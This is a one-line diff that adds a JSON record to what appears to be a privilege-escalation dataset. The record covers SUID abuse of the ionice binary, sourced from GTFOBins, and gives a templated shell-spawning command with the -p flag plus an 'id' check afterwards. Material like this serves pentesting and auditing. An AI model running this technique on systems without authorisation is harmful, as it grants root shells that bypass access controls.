@@ -1,0 +1,1 @@
+{"id":"suid_ionice","category":"SUID_GTFOBINS","binary":"ionice","cve":null,"exploitation":["{{binary}} {{shell}} -p"],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["suid","gtfobins"],"severity":"high"}
